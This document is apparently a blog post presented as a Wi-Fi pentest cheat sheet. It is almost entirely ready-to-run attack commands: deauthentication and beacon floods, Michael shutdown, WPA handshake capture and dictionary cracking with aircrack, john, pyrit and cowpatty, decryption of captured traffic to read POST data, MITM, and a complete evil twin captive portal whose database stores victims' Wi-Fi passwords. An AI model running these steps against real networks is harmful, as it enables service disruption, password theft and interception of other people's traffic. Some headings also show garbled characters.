---
layout: single
title: Wifi Pentest
date: 2021-08-31
classes: wide
header:
  teaser: /assets/images/security.jpg
categories:
  - Blue Team
  - infosec
tags:
  - Blue Team
  - Red Team
---

## Monitor
https://www.acrylicwifi.com/blog/modo-monitor-wifi/

Enable

```
sudo airmon-ng start wlx00c

pkill dhclient && pkill wpa_supplicant

iw config 

sudo ifconfig wlan1mon up

```

## restart network

```
/etc/init.d/networking restart
```


## MAC address spoofing

https://wiki.archlinux.org/title/MAC_address_spoofing_(Espa%C3%B1ol)

```
macchanger -l | grep -i "apple"

sudo macchanger --mac=00:20:91:ad:fa:91 wlan1mon
```

https://es.wikipedia.org/wiki/Aircrack-ng#:~:text=Aircrack%2Dng%20es%20una%20suite,airbase%2Dng

```
sudo airodump-ng wlan1mon
```
https://yisux.wordpress.com/2009/03/11/aircrack-ng-comandos-basicos-para-ataques-con-clientes-asociados/

https://www.aircrack-ng.org/~~V:/doku.php?id=es:airodump-ng#:~:text=Airodump%2Dng%20se%20usa%20para,y%20obtener%20la%20clave%20WEP.

## Specific channel

```
airodump-ng -c 1 wlan1mon
```

## Filter

```
airodump-ng -c 3 --essid AndroidAP7739 wlan1mon
--bssid
```

## Export data

```
airodump-ng -c 3 -w Captura --essid AndroidAP7739 wlan1mon
```

## Handshake

https://hacking-etico.com/2013/05/08/redes-wifi-con-wpawpa2inviolables/#:~:text=El%20handshake%20es%2C%20a%20grosso,la%20contrase%C3%B1a%20WiFi%20pero%20cifrada.

## Desautenticaci칩n 
https://www.google.com/search?q=Ataque+de+de-autenticaci%C3%B3n+aireplay&rlz=1C1GCEA_enES868ES868&oq=Ataque+de+de-autenticaci%C3%B3n+aireplay&aqs=chrome..69i57j33i160.5751j0j7&sourceid=chrome&ie=UTF-8
https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack
Drigido 
```
aireplay-ng -0 10 -e AndroidAP7739 -c MACCLIENTE wlan1mon
```

Global
```
aireplay-ng -0 10 -e AndroidAP7739 -c FF:FF:FF:FF:FF:FF wlan1mon
aireplay-ng -0 10 -e AndroidAP7739  wlan1mon
```

##  Autenticaci칩n falsa

https://www.aircrack-ng.org/doku.php?id=es:shared_key

```
aireplay-ng -1 0 -e AndroidAP7739 -a MACCLIENT -h FALSAMAC wlan1mon
```

## CTS Frame Attack

```
tshark -r captura-01.cap -Y "wlan.fc.type_subtype==28" 2>/dev/null # CHECK CTS
tshark -r captura-01.cap -Y "wlan.fc.type_subtype==28" -Tjson 2>/dev/null # CHECK CTS
tshark -r captura-01.cap -Y "wlan.fc.type_subtype==28" -Tfields -e wlan.duration 2>/dev/null # CHECK CTS

wireshark captura-01.cap > /dev/null 2>&1 &
disown

```

Change HEX BEFORE LAST 10 ADD 30 AND THE NUMBER

```
ghex captura.cap

```

```
tcpreplay --intf1=wlan0mon --topspeed --loop=2000 prueba.cap 2>/dev/null
```

## Beacon flood mode

https://mundo-hackers.weebly.com/beacon-flood.html

```
for i in $(seq 1 10); do echo $1; done
for i in $(seq 1 10); do echo "MyNetwork$i" >> redes.txt; done

mdk3 wlan0mon b -f redes -a -s 1000 -c 3

```

## Disassociation amok mode

https://mundo-hackers.weebly.com/amok-mode---disassociation.html


```
nano blacklist # a침adir station (clientes a expulsar)
mdk3 d -w blacklist -c 1
```

## Michael shutdown exploitation
https://mundo-hackers.weebly.com/michael-shutdown-exploitation.html
```
mdk3 wlan0mon m -t MAC 
```

## pyrit

https://github.com/JPaulMora/Pyrit

```
wget 

https://pypi.python.org/packages/6d/72/c055abd32bcd4ee6b36ef8e9ceccc2e242dea9b6c58fdcf2e8fd005f7650/scapy-2.3.2.tar.gz

python setup.py clean
python setup.py build
python setup.py install

python pyrit -r captura.cap analyze
```
# An치lisis
## Probe Request

https://notasinalambricas.wordpress.com/tag/probe-request/

```
tshark -r captura.cap -Y "wlan.fc.type_subtype==4" 2>/dev/null

```

## Probe Response

https://notasinalambricas.wordpress.com/tag/probe-response/

```
tshark -r captura.cap -Y "wlan.fc.type_subtype==5" 2>/dev/null
```

## Association Request
https://mrncciew.com/2014/10/28/802-11-mgmt-association-reqresponse/

```
tshark -r captura.cap -Y "wlan.fc.type_subtype==0" 2>/dev/null
tshark -r captura.cap -Y "wlan.fc.type_subtype==0" -TJson 2>/dev/null 
tshark -r captura.cap -Y "wlan.fc.type_subtype==0" -Tfields -e wlan.addr 2>/dev/null | tr ',' '\n' | sort -u
```
## Association Response
https://mrncciew.com/2014/10/28/802-11-mgmt-association-reqresponse/

```
tshark -r captura.cap -Y "wlan.fc.type_subtype==1" 2>/dev/null 
```

## Beacon packet

https://es.wikipedia.org/wiki/Beacon_frame


```
tshark -r captura.cap -Y "wlan.fc.type_subtype==8" 2>/dev/null
tshark -r captura.cap -Y "wlan.fc.type_subtype==8" -Tjson 2>/dev/null

```

## Autentication packets

```
tshark -r captura.cap -Y "wlan.fc.type_subtype==11" 2>/dev/null
```
## Deutentication packets
https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack
```
tshark -r captura.cap -Y "wlan.fc.type_subtype==12" 2>/dev/null | grep -i "FF:FF:FF:FF:FF:FF"
tshark -r captura.cap -Y "wlan.fc.type_subtype==12" -Tfields -e wlan.da 2>/dev/null | sort -u
```

## Dissasociation frames
https://mrncciew.com/2014/10/11/802-11-mgmt-deauth-disassociation-frames/
```
tshark -r captura.cap -Y "wlan.fc.type_subtype==10"  2>/dev/null 
```

## CTSFRAME

```
tshark -r captura.cap -Y "wlan.fc.type_subtype==28"  2>/dev/null 
```

# HASH

## Extract aircrack

```
aircrack-ng -J micaptura captura.cap
hccap2john micaptura.hccap > mihash

```

## crack

https://esgeeks.com/cracking-claves-wifi-con-aircrack-ng/

```
aircrack-ng -w dic.txt captura.cap 
```
```
cat mihash | xclip -sel clip
hashid ''
hash-identifier
```

## john

```
john --wordlist=dic.txt mihash
```

## Bettercap
https://null-byte.wonderhowto.com/how-to/hack-wi-fi-networks-with-bettercap-0194422/

```
./bettercap -iface wlan1mon

set wifi.show.sort clients desc
set ticker.commands 'clear; wifi.show'
ticker on
wifi.recon.channel 1 #chose channel
wifi.deauth MAC
```

## Rainbow Table

https://www.ionos.es/digitalguide/servidores/seguridad/rainbow-tables/

## crack with Pyrit

https://null-byte.wonderhowto.com/how-to/crack-wpa-wpa2-wi-fi-passwords-with-pyrit-0196782/

```
pyrit -r captura.cap analyze
pyrit -r captura.cap -e AP -i dic.txt attack_passthrough
```

## Cracking with Cowpatty
https://mundo-hackers.weebly.com/crackingcowpatty.html
```
cowpatty -r captura.cap -f dic.txt -s AP
```

## Crack airolib
https://underc0de.org/foro/wireless/airolib-ng-(el-'rapido'-crackeo-de-wpawpa2)/
```
airolib-ng passwords-airolib --import passwd dic.txt
echo "AP" > essid.lst
airolib-ng passwords-airolib --import essid essid.lst
airolib-ng passwords-airolib --clean all
airolib-ng passwords-airolib --batch
aircrack-ng -r passwords-airolib captura.cap
```

## Create Rainbow table GenPMK

```
genpmk -f dic.txt -s AP -d dic.genpmk

```

## Cowpatty Rainbow tables

https://thehackerway.com/2012/05/17/wireless-hacking-utilizando-cowpatty-y-pyrit-para-optimizar-ataques-por-diccionario-contra-wpawpa2-parte-xv/

```
cowpatty -d dic.genpmk -r captura.cap -s AP 
```

## Pyrit rainbow tables

```
pyrit -e AP -i dic.genpmk -r captura.cap attack_cowpatty
```

## Pyrit database attack

```
pyrit -i dic.txt import_passwords 
pyrit -e AP(Nombre) create_essid 
pyrit batch
pyrit -r captura.cap attack_db
```

## Airdecap decrypt packets
https://www.flu-project.com/2012/09/airdecap-ng-mitm-en-el-aire-y-sin-dejar_30.html#:~:text=airdecap%2Dng%20es%20una%20de,sido%20capturado%20mediante%20airodump%2Dng.

```
airdecap-ng -e AP -p pass captura.cap

tshark -r captura-dec.cap -Y "dns" 2>/dev/null
tshark -r captura-dec.cap -Y "http" 2>/dev/null
tshark -r captura-dec.cap -Y "http.request.method==POST" 2>/dev/null
tshark -r captura-dec.cap -Y "http.request.method==POST" -TJson 2>/dev/null
tshark -r captura-dec.cap -Y "http.request.method==POST" -Tfields -e http.file_data 2>/dev/null

```

## MITM
https://sospedia.net/man-in-the-middle-con-xerosploit/#:~:text=La%20herramienta%20Xerosploit%20es%20un,de%20nuestro%20equipo%20al%20router.

```
python3 xerosploit.py 
scan
ip
help
replace
run
/home/slowkep/descargas/slowkep.jpeg
```

## Evil Twin Configuration
https://diegoaltf4.com/evil-twin/
```
cd /etc
nano dhcpd.conf 
  
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.128 netmask 255.255.255.128 {
   option subnet-mask 255.255.255.128;
   option broadcast-address 192.168.1.255;
   option routers 192.168.1.129;
   option domain-name-server 8.8.8.8;
   range 192.168.1.130 192.168.1.140;
   
}
```

```
wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip

service apache2 start && service mysql start
```

```
create database rogue_AP;
use rogue_AP;
create table wpa_keys(password1 varchar(32), password2 varchar(32));
describe wpa_keys
create user fakeap@localhost identified by 'fakeap';
grant all privileges on rogue_AP.* to 'fakeap'@'localhost';
select password1,password2 from wpa_keys;
```

## AP airbase

```
airbase-ng -e AP -c 4 -P wlan1mon
```

# Evil Twin
https://zsecurity.org/wp-content/uploads/2020/08/fapCommands.txt
# Preparing
```
	apt-get update

	apt-get install hostapd dnsmasq apache2 

	airmon-ng start wlan0

	mkdir ~/fap

	cd ~/fap

	nano hostapd.conf 
```
 # Instructions for hostapd.conf: 
```
interface=[INTERFACE NAME]
driver=nl80211
ssid=[WiFi NAME]
hw_mode=g
channel=8
macaddr_acl=0
ignore_broadcast_ssid=0

	nano dnsmasq.conf
```
 # Instructions for dnsmasq.conf: 
```
interface=[INTERFACE NAME]
dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h
dhcp-option=3, 192.168.1.1
dhcp-option=6, 192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```

```

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

```

```
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80
iptables -t nat -A POSTROUTING -j MASQUERADE
```
 # Routing table and gateway:

	ifconfig wlan1mon up 192.168.1.1 netmask 255.255.255.0
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

 # Internet access:

	iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
	iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
	echo 1 > /proc/sys/net/ipv4/ip_forward
  
 # mysql database:
	
	service mysql start
	
	mysql
	
	create database fap;

	create user fapuser;

	grant all on rogueap.* to 'fapuser'@'localhost' identified by 'fappassword';

	use fap;

	create table wpa_keys(password1 varchar(40), password2 varchar(40));
	
	ALTER DATABASE fap CHARACTER SET 'utf8';

	select * from wpa_keys;
	
# Captive portal setup:
	
	rm -rf /var/www/html/*
	
	mv ~/Downloads/fap.zip /var/www/html
	
	cd /var/www/html
	
	unzip fap.zip 
	
	service apache2 start
	

 # --- Starting the attack ---: 

	hostapd hostapd.conf

	dnsmasq -C dnsmasq.conf -d

	dnsspoof -i wlan0mon

	
